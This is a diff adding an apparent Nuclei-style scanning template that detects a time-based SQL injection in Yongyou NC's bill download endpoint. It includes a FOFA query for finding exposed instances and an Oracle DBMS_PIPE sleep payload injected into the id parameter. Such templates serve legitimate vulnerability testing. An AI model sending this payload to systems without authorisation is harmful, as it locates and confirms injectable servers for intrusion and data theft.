@@ -1,0 +1,48 @@
+id: poc-yaml-yongyou-nc-bill-sqli
+info:
+  name: Yongyou NC Bill SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: Yongyou NC
+    fofa-query: app="用友-UFIDA-NC"
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET /index.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "YONYOU NC"
+
+  - raw:
+      - |
+        GET /portal/pt/erfile/down/bill?pageId=login&id=1%27+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),{{t1}})-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Error"
+      - type: dsl
+        dsl:
+          - duration > t1
+          - duration < t2
